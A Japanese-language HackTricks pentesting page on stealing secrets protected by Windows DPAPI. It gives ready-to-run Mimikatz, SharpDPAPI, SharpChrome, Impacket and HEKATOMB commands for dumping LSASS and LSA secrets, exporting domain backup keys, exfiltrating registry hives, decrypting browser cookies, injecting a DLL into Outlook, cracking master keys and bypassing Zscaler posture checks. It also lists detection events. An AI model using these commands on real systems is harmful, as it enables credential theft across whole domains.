# DPAPI - パスワードの抽出

{{#include ../../banners/hacktricks-training.md}}



## DPAPIとは

Data Protection API（DPAPI）は、主にWindowsオペレーティングシステムで**非対称秘密鍵の対称暗号化**に利用され、ユーザーまたはシステムのシークレットを重要なエントロピー源として使用します。この方式により、開発者はユーザーのログオンシークレットから派生した鍵、またはシステム暗号化の場合はシステムのドメイン認証シークレットから派生した鍵を使ってデータを暗号化できます。そのため、開発者自身が暗号化鍵の保護を管理する必要がなくなり、暗号化が簡単になります。

DPAPIを利用する最も一般的な方法は、**`CryptProtectData` と `CryptUnprotectData`** 関数です。これらの関数を使うと、現在ログオンしているプロセスのセキュリティコンテキストでデータを暗号化および復号できます。デフォルトでは、暗号化したデータを復号できるのは、暗号化時と同じユーザーまたはシステムのコンテキストだけです。<sup>[[2]](#references)[[3]](#references)</sup>

これらの関数は、暗号化と復号に使用するオプションの**エントロピーパラメーター**も受け取ります。オプションのエントロピーを使って保護されたデータの復号には、同じエントロピー値が必要です。<sup>[[2]](#references)[[6]](#references)</sup>

### ユーザー鍵の生成

DPAPIは、ユーザーの認証情報からユーザー固有の値（一般に**pre-key**と呼ばれます）を導出します。導出方法はアカウントとオペレーティングシステムのバージョンによって異なります。たとえばImpacketは、UTF-16LEパスワードのSHA-1ダイジェストを使うHMAC-SHA1方式、パスワードのMD4/NT hashを使う別の方式、Protected Users向けのPBKDF2-SHA256派生方式を試します。そのため、オフラインツールでは、平文パスワードまたは入手可能なNT hashから必要なマテリアルを導出できることがよくあります。<sup>[[2]](#references)[[10]](#references)</sup>

これは特に重要です。攻撃者がユーザーのパスワードハッシュを取得できれば、次のことが可能です。

- APIに問い合わせることなく、そのユーザーの鍵で暗号化された**あらゆるデータを復号する**
- オフラインでパスワードの**クラックを試み、有効なDPAPI鍵を生成する**

DPAPIは、保護されたblobごとに新しいマスターキーを作成するのではなく、ユーザーごとに1つ以上の**マスターキー**を保持します。各マスターキーには**GUID**（Globally Unique Identifier）があり、暗号化されたblobには、それを保護するマスターキーが記録されています。<sup>[[2]](#references)</sup>

マスターキーは**`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**ディレクトリに保存されます。ここで`{SID}`はユーザーのSecurity Identifierです。マスターキーファイルには、ユーザーの**pre-key**で保護されたマテリアルと、ドメインユーザーの場合は**ドメインバックアップキー**で保護された復旧用マテリアルが含まれます。<sup>[[2]](#references)</sup>

**マスターキーの暗号化に使われるドメインキーはドメインコントローラーに保存され、変更されない**ことに注意してください。そのため、攻撃者がドメインコントローラーにアクセスできれば、ドメインバックアップキーを取得して、ドメイン内のすべてのユーザーのマスターキーを復号できます。<sup>[[2]](#references)</sup>

暗号化されたblobには、ヘッダー内にデータの暗号化に使用された**マスターキーのGUID**が含まれます。

> [!TIP]
> DPAPIで暗号化されたblobは**`01 00 00 00`**で始まります

マスターキーを探す：

```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```

これは、あるユーザーの複数の Master Key がどのように見えるかを示しています。

![DPAPI とは - ユーザーキーの生成: これは、あるユーザーの複数の Master Key がどのように見えるかを示しています](<../../images/image (1121).png>)

### Machine/System キーの生成

これは、マシンがデータを暗号化するために使うキーです。**DPAPI_SYSTEM LSA secret** に基づいており、SYSTEM ユーザーだけがアクセスできる特別なキーです。このキーは、マシンレベルの認証情報やシステム全体の secret など、システム自体がアクセスする必要のあるデータの暗号化に使われます。<sup>[[2]](#references)</sup>

これらのキーには**ドメインバックアップがない**ため、ローカルでしかアクセスできません。

- **Mimikatz** は、次のコマンドで LSA secret をダンプしてアクセスできます: `mimikatz lsadump::secrets`
- secret はレジストリ内に保存されているため、管理者は**DACL のアクセス許可を変更してアクセスできます**。レジストリのパスは次のとおりです: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- レジストリハイブからオフラインで抽出することも可能です。たとえば、対象マシンの管理者としてハイブを保存し、外部に持ち出します:

```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```

次に、analysis box上でhiveからDPAPI_SYSTEM LSA secretを復元し、それを使ってmachine-scope DPAPI blob（machineで保護されたアプリケーションの認証情報やWi-Fiプロファイルなど）を復号します。

```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```

Veeam固有のDPAPIの例:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

### DPAPIで保護されるデータ

DPAPIで保護される個人データには、次のものがあります。

- Windowsの認証情報
- Internet ExplorerやGoogle Chromeのパスワードと自動入力データ
- OutlookやWindows Mailなどのアプリケーションのメールアカウントや内部FTPアカウントのパスワード
- 共有フォルダー、リソース、ワイヤレスネットワーク、Windows Vaultのパスワード（暗号化キーを含む）
- リモートデスクトップ接続、.NET Passportのパスワードや、さまざまな暗号化・認証用途の秘密鍵
- Credential Managerで管理されるネットワークパスワードや、Skype、MSN MessengerなどCryptProtectDataを使用するアプリケーションの個人データ
- レジストリ内の暗号化されたblob
- ...

システムで保護されるデータには、次のものがあります。
- Wi-Fiのパスワード
- ...

スケジュールされたタスクのパスワードは、別個のLSA-secretの問題です。[Password logon type](https://learn.microsoft.com/en-us/windows/win32/api/taskschd/ne-taskschd-task_logon_type)で登録されたタスクは、ローカル管理者/SYSTEMの復旧用にパスワードを保存できます。S4Uタスクや対話型トークンタスクでは、パスワードが保存されたとは限りません。タスクの実行ユーザー名だけでなく、プリンシパルとログオンの種類のほうが強い判断材料になります。

### Master keyの抽出方法

- ユーザーがドメイン管理者権限を持っている場合、**ドメインバックアップキー**にアクセスして、ドメイン内のすべてのユーザーのmaster keyを復号できます。

```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```

- ローカル管理者権限があれば、**LSASS メモリにアクセス**して、接続中のすべてのユーザーの DPAPI マスターキーと SYSTEM キーを抽出できます。

```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```

- ユーザーがローカル管理者権限を持っている場合、**DPAPI_SYSTEM LSA secret** にアクセスして、マシンのマスターキーを復号できます。

```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```

- ユーザーのパスワードまたはNTLM hashが分かっている場合、**ユーザーのmaster keysを直接復号できます**：

```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```

- ユーザーとしてセッションに入っている場合、RPCを使ってDCに**マスターキーを復号するためのバックアップキー**を要求できます。ローカル管理者であり、ユーザーがログインしている場合は、次の方法で**そのユーザーのセッショントークンを盗む**ことができます:

```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```


## Vault の一覧表示

```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```

## DPAPIで暗号化されたデータへのアクセス

### DPAPIで暗号化されたデータを探す

一般ユーザーの**保護されたファイル**は、次の場所にあります。

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- 上記のパスで `\Roaming\` を `\Local\` に変更した場所も確認してください。

列挙の例：

```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) は、ファイルシステム、レジストリ、B64 blob 内の DPAPI 暗号化 blob を見つけられます:<sup>[[12]](#references)</sup>

```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```

なお、[**SharpChrome**](https://github.com/GhostPack/SharpDPAPI)（同じリポジトリのツール）を使うと、cookies などの機密データを DPAPI で復号できます。<sup>[[12]](#references)</sup>

#### Chromium/Edge/Electron の簡単な手順（SharpChrome）

- 現在のユーザーとして、保存されたログイン情報/cookies を対話的に復号（ユーザーコンテキストで実行すると、Credential Manager から追加のキーが解決されるため、Chrome 127 以降の app-bound cookies でも動作します）:

```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```

- ファイルしかない場合のオフライン解析。まず profile の「Local State」から AES state key を抽出し、それを使って cookie DB を復号します:

```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```

- DPAPI domain backup key（PVK）と対象ホストのadmin権限がある場合の、ドメイン全体／リモートのトリアージ:

```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```

- ユーザーの DPAPI prekey/credkey（LSASS から取得）を持っていれば、password cracking を省略してプロファイルデータを直接 decrypt できます。

```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```

メモ
- 新しい Chrome/Edge ビルドでは、一部の cookies が「App-Bound」暗号化を使用して保存される場合があります。追加の app-bound key がないと、これらの特定の cookies をオフラインで復号することはできません。取得するには、対象ユーザーのコンテキストで SharpChrome を実行してください。以下で参照している Chrome のセキュリティブログ記事を参照してください。<sup>[[5]](#references)</sup>

### アクセスキーとデータ

- **SharpDPAPI を使って**、現在のセッションの DPAPI 暗号化ファイルから認証情報を取得します。

```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage 
```

- **暗号化データやguidMasterKeyなどの認証情報を取得**<sup>[[3]](#references)</sup>

```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```

- **masterkeyへのアクセス**:

RPCを使用してdomain backup keyを要求し、ユーザーのmasterkeyを復号する：
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```

**SharpDPAPI** ツールは、masterkey の復号に次の引数もサポートしています（`/rpc` でドメインの backup key を取得したり、`/password` で平文パスワードを使用したり、`/pvk` で DPAPI ドメイン秘密鍵ファイルを指定したりできます...）：<sup>[[12]](#references)</sup>

```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```

- **masterkeyを使用してデータを復号する**:

```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```

**SharpDPAPI** ツールは、`credentials|vaults|rdg|keepass|triage|blob|ps` の復号にも以下の引数を使用できます（`/rpc` でドメインのバックアップキーを取得したり、`/password` で平文パスワードを使用したり、`/pvk` で DPAPI ドメイン秘密鍵ファイルを指定したり、`/unprotect` で現在のユーザーのセッションを使用したりできます...）：<sup>[[12]](#references)</sup>

```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
                        Note: must use with /pvk:KEY or /password:X
                        Note: not applicable to 'blob' or 'ps' commands
```

- DPAPI prekey/credkey を直接使用する（パスワード不要）

LSASS を dump できる場合、Mimikatz からログオンごとの DPAPI key を取得できることがよくあります。この key を使えば、平文パスワードを知らなくてもユーザーの masterkey を復号できます。この値をそのままツールに渡します。

```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```


- **現在のユーザーセッション**を使用してデータを復号する:

```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```

---

### Impacket dpapi.py を使ったオフライン復号

被害ユーザーの SID とパスワード（または NT hash）があれば、Impacket の dpapi.py を使って DPAPI masterkey と Credential Manager blob を完全にオフラインで復号できます。<sup>[[10]](#references)[[11]](#references)</sup>

- ディスク上の artefact を特定する:
  - Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
  - 対応する masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- ファイル転送ツールが不安定な場合は、ホスト上でファイルを base64 に変換し、出力をコピーします:

```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```

- ユーザーの SID とパスワード/ハッシュを使って masterkey を復号する:

```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
  -sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
  -sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```

- 復号された masterkey を使用して credential blob を復号する:

```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```

このワークフローでは、Windows Credential Managerを使用するアプリが保存したドメイン認証情報を復元できることがよくあります。管理者アカウント（例: `*_adm`）も含まれます。

---

### オプションのエントロピーの処理（「サードパーティエントロピー」）

アプリケーションによっては、`CryptProtectData` に追加の**エントロピー**値を渡します。この値がないと、正しいmasterkeyがわかっていてもblobを復号できません。そのため、この方法で保護された認証情報（例: Microsoft Outlook、一部のVPNクライアント）を標的にする場合、エントロピーの取得が不可欠です。

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture)（2022）は、標的プロセス内のDPAPI関数にフックし、渡されたオプションのエントロピーを透過的に記録するユーザーモードDLLです。`outlook.exe` や `vpnclient.exe` などのプロセスに対して **DLL-injection** モードでEntropyCaptureを実行すると、各エントロピーバッファを呼び出し元のプロセスおよびblobに対応付けたファイルが出力されます。取得したエントロピーは、後で **SharpDPAPI**（`/entropy:`）または **Mimikatz**（`/entropy:<file>`）に渡してデータを復号できます。<sup>[[6]](#references)</sup>

```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```


### masterkey のオフライン cracking (Hashcat & DPAPISnoop)

Microsoft は Windows 10 v1607 (2016) から **context 3** の masterkey フォーマットを導入しました。`hashcat` v6.2.6 (2023年12月) では、ハッシュモード **22100** (DPAPI masterkey v1 context)、**22101** (context 1)、**22102** (context 3) が追加され、masterkey ファイルからユーザーのパスワードを直接 GPU で高速に crack できるようになりました。そのため攻撃者は、対象システムに接続せずに word-list 攻撃や brute-force 攻撃を実行できます。<sup>[[7]](#references)</sup>

`DPAPISnoop` (2024) はこのプロセスを自動化します:

```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```

このツールは Credential と Vault の blob も解析し、crack したキーで復号して、平文パスワードをエクスポートできます。<sup>[[8]](#references)</sup>


### 他のマシンのデータへのアクセス

**SharpDPAPI と SharpChrome** では、**`/server:HOST`** オプションを指定して、リモートマシンのデータにアクセスできます。もちろん、そのマシンにアクセスできる必要があります。また、以下の例では**ドメインのバックアップ暗号化キーが既知**であるものとします:

```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```

### SSRS レポートサーバーデータベース接続

SQL Server Reporting Services (SSRS) ホストでは、`RSReportServer.config` にレポートサーバーデータベース用の暗号化された `<Dsn>` が含まれている場合があります。<sup>[[15]](#references)</sup> SSRS はこれらの接続設定を**ローカルマシンレベルのキー**で保護します。一方、外部レポートデータソースの認証情報は、レポートサーバーデータベース内で対称キーを使って暗号化されます。<sup>[[14]](#references)</sup>

報告された事例では、攻撃者は `Dsn` を抽出し、Base64 デコードしたバイト列を `ProtectedData.Unprotect` と `LocalMachine` スコープで復号しようとしました。<sup>[[13]](#references)</sup>

保護を行ったマシン上で SSRS 設定ファイルへの読み取りアクセスがある場合は、実際のインスタンスパスを特定し、値を調べてください。例のパスは SSRS 2017 以降のものです。マシンレベルの保護には、SSRS サービスアカウントのコンテキストは必要ありません。<sup>[[14]](#references)[[15]](#references)</sup>

```powershell
$path = 'C:\Program Files\Microsoft SQL Server Reporting Services\SSRS\ReportServer\rsreportserver.config'
$config = Get-Content $path -Raw
$b64 = [regex]::Match($config, '<Dsn>([^<]+)</Dsn>').Groups[1].Value
$blob = [Convert]::FromBase64String($b64)
$plain = [Security.Cryptography.ProtectedData]::Unprotect($blob, $null, 'LocalMachine')
[Text.Encoding]::UTF8.GetString($plain)
```

空の、または存在しない `Dsn` では、このメソッドで復号するものがありません。<sup>[[15]](#references)</sup> 復号された接続文字列に、再利用可能なパスワードが必ず含まれるとは限りません。SSRS はサービスアカウントを使用する場合があり、設定されたドメインアカウントには、別個の `LogonUser`、`LogonDomain`、`LogonCred` 設定が存在する場合があります。<sup>[[15]](#references)</sup> 暗号化された値だけを別のマシンにコピーしても、そのマシンは元のホストの保護キーを取得できません。<sup>[[14]](#references)</sup>

その他の SQL Server アクセス経路については、[MSSQL pentesting](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/) を参照してください。

## その他のツール

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) は、LDAP directory からすべてのユーザーとコンピューターを抽出し、RPC 経由で domain controller の backup key を抽出する処理を自動化するツールです。続いてスクリプトは、すべてのコンピューターの IP address を解決し、全コンピューターに対して smbclient を実行して、すべてのユーザーの DPAPI blobs を取得し、domain backup key を使ってすべてを復号します。

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAP から抽出したコンピューター一覧を使えば、知らなかった場合でも、すべてのサブネットワークを見つけられます！

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) は、DPAPI で保護された secrets を自動的に dump できます。2.x リリースでは、次の機能が導入されました。<sup>[[9]](#references)</sup>

* 数百台のホストから blobs を並列収集
* **context 3** masterkeys の解析と Hashcat cracking の自動連携
* Chrome の「App-Bound」暗号化 cookies をサポート（次のセクションを参照）
* 新しい **`--snapshot`** モード。エンドポイントを繰り返しポーリングし、新しく作成された blobs の差分を取得

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) は、masterkey/credential/vault files を解析し、Hashcat/JtR formats を出力できる C# parser で、必要に応じて cracking を自動的に実行することもできます。Windows 11 24H1 までの machine および user masterkey formats を完全にサポートします。<sup>[[8]](#references)</sup>


## よくある検知方法

- `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`、`C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` およびその他の DPAPI 関連ディレクトリ内のファイルへのアクセス。
    - 特に **C$** や **ADMIN$** などの network share 経由のアクセス。
- LSASS memory へのアクセスや masterkeys の dump に **Mimikatz**、**SharpDPAPI** などのツールを使用。
- Event **4662**: *オブジェクトに対する操作が実行されました* – **`BCKUPKEY`** object へのアクセスと関連付けられる場合があります。
- プロセスが *SeTrustedCredManAccessPrivilege* を要求した際の Event **4673/4674**（Credential Manager）

---
### 2023-2025 の脆弱性とエコシステムの変化

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing**（2023 年 11 月）。network access を持つ攻撃者は、ドメインメンバーをだまして悪意のある DPAPI backup key を取得させ、ユーザーの masterkeys を復号できます。2023 年 11 月の累積更新プログラムで修正済みです。管理者は、DC とワークステーションに最新の更新プログラムが適用されていることを確認してください。<sup>[[4]](#references)</sup>
* **Chrome 127 の「App-Bound」cookie encryption**（2024 年 7 月）では、従来の DPAPI のみの保護が、ユーザーの **Credential Manager** に保存される追加キーに置き換えられました。cookie のオフライン復号には、DPAPI masterkey と **GCM でラップされた app-bound key** の両方が必要になりました。SharpChrome v2.3 と DonPAPI 2.x は、ユーザーコンテキストで実行すると追加キーを復元できます。<sup>[[5]](#references)</sup>


### ケーススタディ: Zscaler Client Connector – SID から導出されるカスタム entropy

Zscaler Client Connector は、`C:\ProgramData\Zscaler` 配下に複数の設定ファイル（例: `config.dat`、`users.dat`、`*.ztc`、`*.mtt`、`*.mtc`、`*.mtp`）を保存します。各ファイルは **DPAPI (Machine scope)** で暗号化されていますが、ベンダーはディスク上に保存する代わりに、*実行時に計算される* **custom entropy** を提供します。<sup>[[1]](#references)</sup>

entropy は、次の 2 つの要素から再構築されます。

1. `ZSACredentialProvider.dll` に埋め込まれたハードコードされた secret。
2. 設定が属する Windows アカウントの **SID**。

DLL に実装されたアルゴリズムは、次の処理と同等です。

```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
    tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
    entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```

シークレットはディスクから読み取り可能な DLL に埋め込まれているため、**SYSTEM 権限を持つローカルの攻撃者は、任意の SID の entropy を再生成し、blob をオフラインで復号できます**。

```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```

復号すると完全な JSON 設定が得られ、すべての**デバイスポスチャチェック**とその期待値が含まれています。この情報は、クライアント側の bypass を試みる際に非常に有用です。

> TIP: ほかの暗号化 artefact（`*.mtt`、`*.mtp`、`*.mtc`、`*.ztc`）は、entropy なし（`16` 個のゼロバイト）で DPAPI により保護されています。そのため、SYSTEM 権限を取得すれば、`ProtectedData.Unprotect` で直接復号できます。

## References

- [1] [Synacktiv – 自社の zero trust を信頼すべきか？Zscaler の posture check を bypass する](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [DPAPI Secrets. DPAPI におけるセキュリティ分析とデータ復旧](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Mimikatz と C++ を使って DPAPI で暗号化された secrets を読み取る](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 - Windows DPAPI（Data Protection Application Programming Interface）Spoofing Vulnerability](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Windows における Chrome cookie のセキュリティ強化](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: DPAPI の optional entropy を簡単に抽出](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [hashcat v6.2.6 リリースノート](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – GitHub リポジトリ](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – PyPI プロジェクトページ](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: AD ACL abuse、KeePassXC Argon2 cracking、DPAPI decryption による DC admin への昇格](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – 使い方とオプション](https://github.com/GhostPack/SharpDPAPI)
- [13] [CyberStrikeAI の実態: 組織への実際の攻撃における AI の利用](https://securelist.com/tr/cyberstrikeai-attacks/121715)
- [14] [Microsoft Learn - 暗号化された Report Server データの保存](https://learn.microsoft.com/en-us/sql/reporting-services/install-windows/ssrs-encryption-keys-store-encrypted-report-server-data?view=sql-server-ver16)
- [15] [Microsoft Learn - RSReportServer.config 構成ファイル](https://learn.microsoft.com/en-us/sql/reporting-services/report-server/rsreportserver-config-configuration-file?view=sql-server-ver17)
{{#include ../../banners/hacktricks-training.md}}
